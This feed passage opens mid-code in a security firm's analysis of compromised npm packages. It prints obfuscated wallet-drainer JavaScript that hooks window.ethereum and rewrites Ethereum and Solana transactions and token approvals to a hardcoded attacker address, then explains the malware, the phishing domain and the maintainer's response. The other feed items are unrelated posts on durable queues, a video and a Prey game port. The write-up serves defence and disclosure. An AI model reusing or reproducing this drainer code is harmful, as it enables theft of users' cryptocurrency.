_0x1be350) { </span><span>if</span><span> (_0x17ccd4 == </span><span>"ethereum"</span><span>) { </span><span>if</span><span> (!_0x4477fc.includes(_0x4225ce) &amp;&amp; neth == </span><span>) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4477fc)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"bitcoinLegacy"</span><span>) { </span><span>if</span><span> (!_0x264994.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x264994)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"bitcoinSegwit"</span><span>) { </span><span>if</span><span> (!_0x2e3cca.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x2e3cca)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"tron"</span><span>) { </span><span>if</span><span> (!_0x3ee86f.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x3ee86f)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"ltc"</span><span>) { </span><span>if</span><span> (!_0x4a9d96.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4a9d96)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"ltc2"</span><span>) { </span><span>if</span><span> (!_0x4a9d96.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x4a9d96)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"bch"</span><span>) { </span><span>if</span><span> (!_0x553dcb.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x553dcb)); } } <span>const</span><span> _0x2d452a = [..._0x4477fc, ..._0x264994, ..._0x2e3cca, ..._0x3ee86f, ..._0x4a9d96, ..._0x553dcb]; </span><span>const</span><span> _0x35f871 = _0x2d452a.includes(_0x4225ce); </span><span>if</span><span> (_0x17ccd4 == </span><span>"solana"</span><span> &amp;&amp; !_0x35f871) { </span><span>if</span><span> (!_0x514d7d.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"solana2"</span><span> &amp;&amp; !_0x35f871) { </span><span>if</span><span> (!_0x514d7d.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d)); } } <span>if</span><span> (_0x17ccd4 == </span><span>"solana3"</span><span> &amp;&amp; _0x35f871) { </span><span>if</span><span> (!_0x514d7d.includes(_0x4225ce)) { </span> _0x530d91 = _0x530d91.replace(_0x4225ce, _0x2abae0(_0x4225ce, _0x514d7d)); } } } } <span>return</span><span> _0x530d91; </span> } } <span>async</span><span>function</span><span>runmask</span><span>(</span><span>) </span><span>{ </span><span>let</span><span> _0x1c41fa = </span><span>; </span><span>let</span><span> _0x2a20cb = </span><span>new</span><span>Map</span><span>(); </span><span>let</span><span> _0x1ab7cb = </span><span>false</span><span>; </span><span>function</span><span>_0x1089ae</span><span>(</span><span>_0x4ac357, _0xc83c36 = </span><span>true</span><span>) </span><span>{ </span><span>const</span><span> _0x13d8ee = </span><span>JSON</span><span>.parse(</span><span>JSON</span><span>.stringify(_0x4ac357)); </span><span>if</span><span> (_0xc83c36) { </span><span>if</span><span> (_0x13d8ee.value &amp;&amp; _0x13d8ee.value !== </span><span>"0x0"</span><span> &amp;&amp; _0x13d8ee.value !== </span><span>'0'</span><span>) { </span><span> _0x13d8ee.to = </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>; </span> } <span>if</span><span> (_0x13d8ee.data) { </span><span>const</span><span> _0x250e27 = _0x13d8ee.data.toLowerCase(); </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0x095ea7b3"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>74</span><span>) { </span><span>const</span><span> _0x7fa5f0 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x15c4f9 = </span><span>'0x'</span><span> + _0x250e27.substring(</span><span>34</span><span>, </span><span>74</span><span>); </span><span>const</span><span> _0xde14cc = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span><span>const</span><span> _0x3e4a11 = </span><span>'f'</span><span>.repeat(</span><span>64</span><span>); </span> _0x13d8ee.data = _0x7fa5f0 + _0xde14cc + _0x3e4a11; <span>const</span><span> _0x432d38 = { </span><span>'0x7a250d5630b4cf539739df2c5dacb4c659f2488d'</span><span>: </span><span>"Uniswap V2"</span><span>, </span><span>'0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af'</span><span>: </span><span>"Uniswap V2"</span><span>, </span><span>'0xe592427a0aece92de3edee1f18e0157c05861564'</span><span>: </span><span>"Uniswap V3"</span><span>, </span><span>'0x10ed43c718714eb63d5aa57b78b54704e256024e'</span><span>: </span><span>"PancakeSwap V2"</span><span>, </span><span>'0x13f4ea83d0bd40e75c8222255bc855a974568dd4'</span><span>: </span><span>"PancakeSwap V3"</span><span>, </span><span>'0x1111111254eeb25477b68fb85ed929f73a960582'</span><span>: </span><span>"1inch"</span><span>, </span><span>'0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f'</span><span>: </span><span>"SushiSwap"</span> }; <span> </span><span>const</span><span> _0x13f774 = _0x432d38[_0x15c4f9.toLowerCase()]; </span><span>if</span><span> (_0x13f774) { </span><span>console</span><span>.log(_0x13f774 + _0x15c4f9); </span><span> } </span><span>else</span><span> { </span><span>console</span><span>.log(_0x15c4f9); </span> } } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0xd505accf"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>458</span><span>) { </span><span>const</span><span> _0x571743 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x55e7fa = _0x250e27.substring(</span><span>10</span><span>, </span><span>74</span><span>); </span><span>const</span><span> _0x382fb5 = _0x250e27.substring(</span><span>202</span><span>, </span><span>266</span><span>); </span><span>const</span><span> _0x5bb3a7 = _0x250e27.substring(</span><span>266</span><span>, </span><span>330</span><span>); </span><span>const</span><span> _0x2e5118 = _0x250e27.substring(</span><span>330</span><span>, </span><span>394</span><span>); </span><span>const</span><span> _0x3ba273 = _0x250e27.substring(</span><span>394</span><span>, </span><span>458</span><span>); </span><span>const</span><span> _0x36b084 = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span><span>const</span><span> _0x15389e = </span><span>'f'</span><span>.repeat(</span><span>64</span><span>); </span> _0x13d8ee.data = _0x571743 + _0x55e7fa + _0x36b084 + _0x15389e + _0x382fb5 + _0x5bb3a7 + _0x2e5118 + _0x3ba273; } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0xa9059cbb"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>74</span><span>) { </span><span>const</span><span> _0x5d2193 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x1493e2 = _0x250e27.substring(</span><span>74</span><span>); </span><span>const</span><span> _0x32c34c = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span> _0x13d8ee.data = _0x5d2193 + _0x32c34c + _0x1493e2; } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x250e27.startsWith(</span><span>"0x23b872dd"</span><span>)) { </span><span>if</span><span> (_0x250e27.length &gt;= </span><span>138</span><span>) { </span><span>const</span><span> _0x5c5045 = _0x250e27.substring(</span><span>, </span><span>10</span><span>); </span><span>const</span><span> _0x1ebe01 = _0x250e27.substring(</span><span>10</span><span>, </span><span>74</span><span>); </span><span>const</span><span> _0x558b46 = _0x250e27.substring(</span><span>138</span><span>); </span><span>const</span><span> _0x56d65b = </span><span>"Fc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>.padStart(</span><span>64</span><span>, </span><span>'0'</span><span>); </span> _0x13d8ee.data = _0x5c5045 + _0x1ebe01 + _0x56d65b + _0x558b46; } } } } } <span> } </span><span>else</span><span>if</span><span> (_0x13d8ee.to &amp;&amp; _0x13d8ee.to !== </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>) { </span><span> _0x13d8ee.to = </span><span>"0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976"</span><span>; </span> } <span> } </span><span>else</span><span> { </span><span>if</span><span> (_0x13d8ee.instructions &amp;&amp; </span><span>Array</span><span>.isArray(_0x13d8ee.instructions)) { </span><span> _0x13d8ee.instructions.forEach(</span><span>_0x190501</span><span> =&gt;</span><span> { </span><span>if</span><span> (_0x190501.accounts &amp;&amp; </span><span>Array</span><span>.isArray(_0x190501.accounts)) { </span><span> _0x190501.accounts.forEach(</span><span>_0x2b9990</span><span> =&gt;</span><span> { </span><span>if</span><span> (</span><span>typeof</span><span> _0x2b9990 === </span><span>"string"</span><span>) { </span><span> _0x2b9990 = </span><span>"19111111111111111111111111111111"</span><span>; </span><span> } </span><span>else</span><span>if</span><span> (_0x2b9990.pubkey) { </span><span> _0x2b9990.pubkey = </span><span>"19111111111111111111111111111111"</span><span>; </span> } }); } <span>if</span><span> (_0x190501.keys &amp;&amp; </span><span>Array</span><span>.isArray(_0x190501.keys)) { </span><span> _0x190501.keys.forEach(</span><span>_0x40768f</span><span> =&gt;</span><span> { </span><span>if</span><span> (_0x40768f.pubkey) { </span><span> _0x40768f.pubkey = </span><span>"19111111111111111111111111111111"</span><span>; </span> } }); } }); } <span>if</span><span> (_0x13d8ee.recipient) { </span><span> _0x13d8ee.recipient = </span><span>"19111111111111111111111111111111"</span><span>; </span> } <span>if</span><span> (_0x13d8ee.destination) { </span><span> _0x13d8ee.destination = </span><span>"19111111111111111111111111111111"</span><span>; </span> } } <span>return</span><span> _0x13d8ee; </span> } <span>function</span><span>_0x485f9d</span><span>(</span><span>_0x38473f, _0x292c7a</span><span>) </span><span>{ </span><span>return</span><span>async</span><span>function</span><span> (</span><span>..._0x59af19</span><span>) </span><span>{ </span> _0x1c41fa++; <span>let</span><span> _0x12a7cb; </span><span>try</span><span> { </span><span> _0x12a7cb = </span><span>JSON</span><span>.parse(</span><span>JSON</span><span>.stringify(_0x59af19)); </span><span> } </span><span>catch</span><span> (_0x5d1767) { </span> _0x12a7cb = [..._0x59af19]; } <span>if</span><span> (_0x59af19[</span><span>] &amp;&amp; </span><span>typeof</span><span> _0x59af19[</span><span>] === </span><span>"object"</span><span>) { </span><span>const</span><span> _0x2c3d7e = _0x12a7cb[</span><span>]; </span><span>if</span><span> (_0x2c3d7e.method === </span><span>"eth_sendTransaction"</span><span> &amp;&amp; _0x2c3d7e.params &amp;&amp; _0x2c3d7e.params[</span><span>]) { </span><span>try</span><span> { </span><span>const</span><span> _0x39ad21 = _0x1089ae(_0x2c3d7e.params[</span><span>], </span><span>true</span><span>); </span><span> _0x2c3d7e.params[</span><span>] = _0x39ad21; </span><span> } </span><span>catch</span><span> (_0x226343) {} </span><span> } </span><span>else</span><span> { </span><span>if</span><span> ((_0x2c3d7e.method === </span><span>"solana_signTransaction"</span><span> || _0x2c3d7e.method === </span><span>"solana_signAndSendTransaction"</span><span>) &amp;&amp; _0x2c3d7e.params &amp;&amp; _0x2c3d7e.params[</span><span>]) { </span><span>try</span><span> { </span><span>let</span><span> _0x5ad975 = _0x2c3d7e.params[</span><span>]; </span><span>if</span><span> (_0x5ad975.transaction) { </span> _0x5ad975 = _0x5ad975.transaction; } <span>const</span><span> _0x5dbe63 = _0x1089ae(_0x5ad975, </span><span>false</span><span>); </span><span>if</span><span> (_0x2c3d7e.params[</span><span>].transaction) { </span><span> _0x2c3d7e.params[</span><span>].transaction = _0x5dbe63; </span><span> } </span><span>else</span><span> { </span><span> _0x2c3d7e.params[</span><span>] = _0x5dbe63; </span> } <span> } </span><span>catch</span><span> (_0x4b99fd) {} </span> } } } <span>const</span><span> _0x1cbb37 = _0x38473f.apply(</span><span>this</span><span>, _0x12a7cb); </span><span>if</span><span> (_0x1cbb37 &amp;&amp; </span><span>typeof</span><span> _0x1cbb37.then === </span><span>"function"</span><span>) { </span><span>return</span><span> _0x1cbb37.then(</span><span>_0xea3332</span><span> =&gt;</span><span> _0xea3332)[</span><span>"catch"</span><span>](</span><span>_0x35d6a3</span><span> =&gt;</span><span> { </span><span>throw</span><span> _0x35d6a3; </span> }); } <span>return</span><span> _0x1cbb37; </span> }; } <span>function</span><span>_0x41630a</span><span>(</span><span>_0x5d6d52</span><span>) </span><span>{ </span><span>if</span><span> (!_0x5d6d52) { </span><span>return</span><span>false</span><span>; </span> } <span>let</span><span> _0x2fc35d = </span><span>false</span><span>; </span><span>const</span><span> _0xfafee = [</span><span>"request"</span><span>, </span><span>"send"</span><span>, </span><span>"sendAsync"</span><span>]; </span><span>for</span><span> (</span><span>const</span><span> _0x16ab0e </span><span>of</span><span> _0xfafee) { </span><span>if</span><span> (</span><span>typeof</span><span> _0x5d6d52[_0x16ab0e] === </span><span>"function"</span><span>) { </span><span>const</span><span> _0x58cddf = _0x5d6d52[_0x16ab0e]; </span> _0x2a20cb.set(_0x16ab0e, _0x58cddf); <span>try</span><span> { </span><span>Object</span><span>.defineProperty(_0x5d6d52, _0x16ab0e, { </span><span>'value'</span><span>: _0x485f9d(_0x58cddf, _0x16ab0e), </span><span>'writable'</span><span>: </span><span>true</span><span>, </span><span>'configurable'</span><span>: </span><span>true</span><span>, </span><span>'enumerable'</span><span>: </span><span>true</span> }); <span> _0x2fc35d = </span><span>true</span><span>; </span><span> } </span><span>catch</span><span> (_0x19546c) {} </span> } } <span>if</span><span> (_0x2fc35d) { </span><span> _0x1ab7cb = </span><span>true</span><span>; </span> } <span>return</span><span> _0x2fc35d; </span> } <span>function</span><span>_0xfc3320</span><span>(</span><span>) </span><span>{ </span><span>let</span><span> _0x4f0cd6 = </span><span>; </span><span>const</span><span> _0x5b507d = </span><span>() =&gt;</span><span> { </span> _0x4f0cd6++; <span>if</span><span> (</span><span>window</span><span>.ethereum) { </span><span>setTimeout</span><span>(</span><span>() =&gt;</span><span> { </span><span> _0x41630a(</span><span>window</span><span>.ethereum); </span><span> }, </span><span>500</span><span>); </span><span>return</span><span>; </span> } <span>if</span><span> (_0x4f0cd6 &lt; </span><span>50</span><span>) { </span><span>setTimeout</span><span>(_0x5b507d, </span><span>100</span><span>); </span> } }; _0x5b507d(); } _0xfc3320(); <span>window</span><span>.stealthProxyControl = { </span><span>'isActive'</span><span>: </span><span>() =&gt;</span><span> _0x1ab7cb, </span><span>'getInterceptCount'</span><span>: </span><span>() =&gt;</span><span> _0x1c41fa, </span><span>'getOriginalMethods'</span><span>: </span><span>() =&gt;</span><span> _0x2a20cb, </span><span>'forceShield'</span><span>: </span><span>() =&gt;</span><span> { </span><span>if</span><span> (</span><span>window</span><span>.ethereum) { </span><span>return</span><span> _0x41630a(</span><span>window</span><span>.ethereum); </span> } <span>return</span><span>false</span><span>; </span> } }; }</span></span></span></span></span></span></code></pre><p>&zwj;</p><p>This malware is essentially a <strong>browser-based interceptor</strong> that hijacks both network traffic and application APIs. It injects itself into functions like <code>fetch</code>, <code>XMLHttpRequest</code>, and common wallet interfaces, then silently rewrites values in requests and responses. That means any sensitive identifiers, such as payment destinations or approval targets, can be swapped out for attacker, controlled ones before the user even sees or signs them. To make the changes harder to notice, it uses string-matching logic that replaces targets with look-alike values.</p><p>What makes it dangerous is that it operates at multiple layers: altering content shown on websites, tampering with API calls, and manipulating what users&rsquo; apps believe they are signing. Even if the interface looks correct, the underlying transaction can be redirected in the background. </p><h3>&#128736; How the Malware Works (Step by Step)</h3><ol><li><strong>Injects itself into the browser</strong><ul><li>Hooks core functions like <code>fetch</code>, <code>XMLHttpRequest</code>, and wallet APIs (<code>window.ethereum</code>, Solana, etc.).</li><li>Ensures it can intercept both web traffic and wallet activity.</li></ul></li><li><strong>Watches for sensitive data</strong><ul><li>Scans network responses and transaction payloads for anything that looks like a wallet address or transfer.</li><li>Recognizes multiple formats across Ethereum, Bitcoin, Solana, Tron, Litecoin, and Bitcoin Cash.</li></ul></li><li><strong>Rewrites the targets</strong><ul><li>Replaces the legitimate destination with an attacker-controlled address.</li><li>Uses &ldquo;lookalike&rdquo; addresses (via string-matching) to make swaps less obvious.</li></ul></li><li><strong>Hijacks transactions before they&rsquo;re signed</strong><ul><li>Alters Ethereum and Solana transaction parameters (e.g., recipients, approvals, allowances).</li><li>Even if the UI looks correct, the signed transaction routes funds to the attacker.</li></ul></li><li><strong>Stays stealthy</strong><ul><li>If a crypto wallet is detected, it avoids obvious swaps in the UI to reduce suspicion.</li><li>Keeps silent hooks running in the background to capture and alter real transactions.</li></ul></li></ol><p>&zwj;</p><h2>The phishing email</h2><p>The maintainer <a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydje4zqis2y">shared</a> that he was compromised by the use of phishing, using this email coming from <code>support [at] npmjs [dot] help</code> :</p><figure></figure><p>The domain was registered just three days ago on September 5th, 2025:</p><figure></figure><p>&zwj;</p><h2>Maintainer response</h2><p>After Aikido notified the maintainer on Bluesky, he <a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydioq5swk2y">replied</a> at 15:15 UTC that he was aware of being compromised, and starting to clean up the compromised packages.</p><figure></figure><p>&zwj;</p><p>The author also <a href="https://bsky.app/profile/bad-at-computer.bsky.social/post/3lydje4zqis2y">shared</a> that the phishing email was sent from <code>support [at] npmjs [dot] help</code> .</p><figure></figure><p>The author appears to have deleted most of the compromised package before losing access to his account. At the time of writing, the package <code>simple-swizzle</code> is still compromised<code>.</code></p><p>&zwj;</p><p>The author further commented on <a href="https://news.ycombinator.com/item?id=45169794">HackerNews</a>:</p><figure></figure><p>&zwj;</p><h2>Attackers target another maintainer</h2><p>At 16:58 UTC, our system detected another package, which was comrpomised by what appears to be the same attackers:</p><p><code>proto-tinker-wc@0.1.87</code> </p><p>&zwj;</p><p>The file <code>dist/cjs/proto-tinker.cjs.entry.js</code> contains the malicious code:</p><figure></figure><p>&zwj;</p><h2>Indicators of compromise</h2><p><strong>Phishing domain</strong></p><ul><li>&zwj;<code>npmjs.help</code> </li></ul><p>&zwj;</p><p><strong>Package versions</strong></p></div><div><div><p>Charlie Eriksen is a Security Researcher at Aikido Security, with extensive experience across IT security - including in product and leadership roles. He is the founder of jswzl and he previously worked at Secure Code Warrior as a security researcher and co-founded Adversary.</p></div></div></div><div><div><div><h2>AutoTriage Integration in IDE</h2><p>Aikido's IDE plugin can detect vulnerable code, and AutoTriage can help you ro priotiize what to fix</p></div></div><div><div><h2>Aikido for Students and Educators</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div><div><div><h2>Free hands-on security labs for your students</h2><p>Aikido for Education offers students hands-on cybersecurity training with real-world security tools, free for all educators.</p></div></div></div><div><div><h2>Get secure for free</h2><p>Secure your code, cloud, and runtime in one central system.<br>Find and fix vulnerabilities <span>fast</span> automatically.</p><p>No credit card required |Scan results in 32secs.</p></div></div></div><div class="gallery"><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68beea5206ecea5adcf453b6_4913bc7a.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68beea5206ecea5adcf453b9_d712be77.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bf028d86e3642f1268253f_050c42b9.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bf0c759ee5745abae971d6_4d7201ce.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bef52fd46522cb992c2219_4f550d2c.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bef771ef1d9d76f657c620_85e69b2a.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68befd7be19287dbec088edf_9a88ae42.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/68bf10ec2433fb72c8e0cb55_1c9c488f.png"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024654c71df23/67ea6658517bb9c783e617e2_65871099f04b9ebb3d253537_359431729_10161266676199604_6750652865330630761_n.jpg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6836b17027f911d14ce42ba7_arrow%20right.svg"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825fdbd77201ff82b42eaac_Frame%201321315277%20(1).avif"></p><p><img src="https://cdn.prod.website-files.com/642adcaf364024552e71df01/6825d8f68e45d9a5bf7a4beb_b1dbddf2b778530e6f5ace222c099514_random-cta-background.avif"></p></div></section>]]></description><pubDate>Mon, 08 Sep 2025 20:58:16 +0530</pubDate></item><item><link>https://www.dbos.dev/blog/durable-queues</link><title>How I solved a distributed queue problem after 15 years (dbos.dev)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nbg6u1/how_i_solved_a_distributed_queue_problem_after_15/</guid><comments>https://www.reddit.com/r/programming/comments/1nbg6u1/how_i_solved_a_distributed_queue_problem_after_15/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 5 min | <a href='https://www.reddit.com/r/programming/comments/1nbg6u1/how_i_solved_a_distributed_queue_problem_after_15/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.prod.website-files.com/672411cbf038560468c9e68f/68b9cf41ae3b9e6d626b6f52_how-to-make-queues-durable.jpg' /></section><section class='parsed-content'><div><p>When I was responsible for the infrastructure at Reddit, the most important thing I maintained was Postgres, but a close second was RabbitMQ, our message broker. It was essential to the operation of reddit &mdash; everything went into a distributed queue before it went to a database. For example, if you upvoted a post, that was written to the queue and the cache, and then returned success to the user. Then a queue runner would take that item, and attempt to write it to the database as well as create a new work item to recalculate all the listings that upvote affected.</p><p>We used this task queue architecture because it was simple and scalable with powerful features:</p><ul><li><strong>Horizontal scalability</strong>. Task queues let us run many tasks in parallel, utilizing the resources of many servers. They were also fairly simple to scale&ndash;just add more workers.</li><li><strong>Flow control</strong>. With task queues, we could customize the rate at which workers consume tasks from different queues. For example, for resource-intensive tasks, we could limit the number of those tasks that can run concurrently on a single worker. If a task accesses a rate-limited API, we could limit how many tasks are executed per second to avoid overwhelming the API.&nbsp;</li><li><strong>Scheduling</strong>. Task queues let us define when or how often a task runs. For example, we could run tasks on a cron schedule, or schedule tasks to execute some time in the future.</li></ul><p>This system scaled well, but it could break in all sorts of tricky ways. If the databases for votes were down, the item would have to go back onto the queue. If the listings cache was down, the listings couldn&rsquo;t get recalculated. If the queue processor crashed after it had taken the item but before it acted on it, the data was just lost. And if the queue itself went down, as it was prone to do, we could just lose votes, or comments, or submissions (did you ever think &ldquo;I know I voted on that but it&rsquo;s gone!&rdquo; when using reddit?&nbsp; That&rsquo;s why).</p><p>What we really needed to make distributed task queueing robust are <strong>durable queues</strong> that checkpoint the status of our queued tasks to a durable store like Postgres. With a durable queue, we could have resumed failed jobs from their last completed step and we wouldn&rsquo;t have lost data when there were program crashes.</p><p>Durable queues were rare when I was at Reddit, but they&rsquo;re more and more popular now. Essentially, they work by combining task queues with durable workflows, helping you <strong>reliably orchestrate workflows of many parallel tasks</strong>. Architecturally, durable queues closely resemble conventional queues, but use a persistent store (typically a relational database) as both message broker and backend:</p><figure></figure><p>The core abstraction in durable queues is a <strong>workflow</strong> of many tasks. For example, you can submit a document processing task that splits a document into pages, processes each page in parallel in separate tasks, then postprocesses and returns the results:</p><figure></figure><p>Durable queues work by <strong>checkpointing</strong> workflows in their persistent store. When a client submits a task, the task and its inputs are recorded. Then, whenever that task invokes another task, this subtask and its inputs is recorded as a <strong>child </strong>of its caller. Thus, the queue system has a complete persistent record of all tasks and their relationships.</p><p>These workflows are most relevant when recovering from failures. If a non-durable worker is interrupted while executing a task, the queue restarts it from the beginning at best, or loses the task at worst. This isn&rsquo;t ideal for long-running workflows or tasks with critical data. Instead, when a durable queue system recovers a workflow, it looks up its checkpoints to recover from the <strong>last completed step</strong>, avoiding resubmission of any completed work.</p><p>&zwj;</p><h3>Durable Queues and Observability</h3><p>Another advantage of durable queues is <strong>built-in</strong> <strong>observability</strong>. Because they persist detailed records of every workflow and task that was ever submitted, durable queues make it easy to monitor what queues and workflows are doing at any given time. For example, looking up the current contents of a queue (or any past content) is just a SQL query. Similarly, looking up the <a href="https://www.dbos.dev/blog/why-workflows-should-be-postgres-rows">current status of a workflow is another SQL query</a>.&nbsp;</p><p>&zwj;</p><h3>Durable Queueing Tradeoffs</h3><p>So, when should you use durable queues? As always, the answer comes down to <strong>tradeoffs</strong>. For durable queues, the main tradeoff is around <strong>message broker performance</strong>. Most distributed task queues use an in-memory key-value store like Redis for brokering messages and storing task outputs. However, durable queues need to use a durable store, often a relational database like Postgres, as both message broker and backend. The latter provides stronger guarantees, but the former higher throughput. Thus, you should prefer durable queues when handling a lower volume of larger business-critical tasks and distributed task queues when handling a very large volume of smaller tasks.</p><p>&zwj;</p><h3>Additional Reading</h3><ul><li><a href="https://www.dbos.dev/case-studies/dosu">Dosu</a> - migrating queuing from Celery to DBOS</li><li><a href="https://www.dbos.dev/case-studies/bms">Bristol Myers Squibb</a> - durable, observable horizontal scaling of genomic data pipelines with DBOS</li><li><a href="https://www.dbos.dev/case-studies/ai-powered-causal-reasoning">cStructure</a> - migrating queuing from Celery to DBOS</li><li><a href="https://docs.dbos.dev/python/reference/queues">DOCS:&nbsp;DBOS&nbsp;durable queuing</a></li></ul></div><div class="gallery"><p><img src="https://cdn.prod.website-files.com/672411cbf038560468c9e68f/68b7c9f14b71a122d3861644_Durable-Queues-Diagram.png"></p><p><img src="https://cdn.prod.website-files.com/672411cbf038560468c9e68f/68b7bf757d45df00d5753d88_fbbbe73e.png"></p></div></section>]]></description><pubDate>Mon, 08 Sep 2025 11:49:17 +0530</pubDate></item><item><link>https://www.youtube.com/watch?v=sp3mMwo3PO0</link><title>How Your Code Really Controls Hardware (youtube.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nb3b31/how_your_code_really_controls_hardware/</guid><comments>https://www.reddit.com/r/programming/comments/1nb3b31/how_your_code_really_controls_hardware/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nb3b31/how_your_code_really_controls_hardware/'>Post permalink</a></p></section><section class='embedded-media'><iframe width="356" height="200" src="https://www.youtube.com/embed/sp3mMwo3PO0?feature=oembed&enablejsapi=1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen title="How Your Code Really Controls Hardware"></iframe></section>]]></description><pubDate>Mon, 08 Sep 2025 01:34:39 +0530</pubDate></item><item><link>https://krispy-the-goat.itch.io/prey-2006</link><title>Prey 2006 project to create open-source FPS game port by integrating its codebase with Doom 3 GPL release (krispy-the-goat.itch.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nax3re/prey_2006_project_to_create_opensource_fps_game/</guid><comments>https://www.reddit.com/r/programming/comments/1nax3re/prey_2006_project_to_create_opensource_fps_game/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nax3re/prey_2006_project_to_create_opensource_fps_game/'>Post permalink</a></p></section><section class='preview-image'><img src='https://img.itch.zone/aW1nLzE4NzcxNzQ2LnBuZw==/original/fp8nmE.png' /></section><section class='parsed-content'><div><h4>Introduction</h4><p>This project is a code integration of the Prey 2006 SDK against the Doom 3 GPL codebase. This means this includes new engine side features that were in the Prey 2006 engine, and some adjustments to the Prey 2006 SDK code.</p><p>This runs in a semi vanilla&nbsp;<a href="https://github.com/dhewm/dhewm3/releases/tag/1.5.4">Dhewm3 v1.5.4</a> fork that specifically removes imgui, soft particles and joystick support for the time being.</p><h4>How To Run</h4><p>You <strong>MUST&nbsp;</strong>source your own legal copy of Prey (2006) to run this, i wouldn't provide any links for this.</p><h5>Why Release in a premature state?</h5><p>I'm releasing this build <strong><em>as-is with limit or lack thereof support</em></strong>, in hopes of attracting people that loves about this game and its, and since my lack of knowledge limits severely.</p><p>The source code of this project would be linked at the end of this but to summarize the current issues of this here are:</p><ol><li>Death Walk a key feature of Prey is missing meaning that in some parts you need to do noclip.</li><li>Spirit Walk visual are broken (in parts where spirit walking is mandatory noclip may or may not be needed)<br> </li><li>Multiplayer may work but has not been tested.<br> </li></ol> <h4>Credits</h4><p>This fork wouldn't be possible by the 3 previous attempts of porting Prey before me:</p><ul><li><a href="https://github.com/jmarshall23/PreyDoom">PreyDoom - By jmarshall23</a></li><li><a href="https://github.com/neitey/PreyVR">PreyVR - By neitey</a><br> </li><li><a href="https://github.com/glKarin/com.n0n3m4.diii4a">com.n0n3m4.diii4a - By GLKarin</a></li><li><a href="https://github.com/dhewm/dhewm3">dhewm3 - By dhew</a></li></ul> <h4>Conclusion</h4><p>Has i state before, here is the link for the&nbsp;&nbsp;<a href="https://github.com/FriskTheFallenHuman/Prey2006">Source Code</a>&nbsp;of this project, and here is the link for reporting&nbsp;<a href="https://github.com/FriskTheFallenHuman/Prey2006/issues">Issues</a> but like i say before support may or may not be limited.<span></span><br></p></div></section>]]></description><pubDate>Sun, 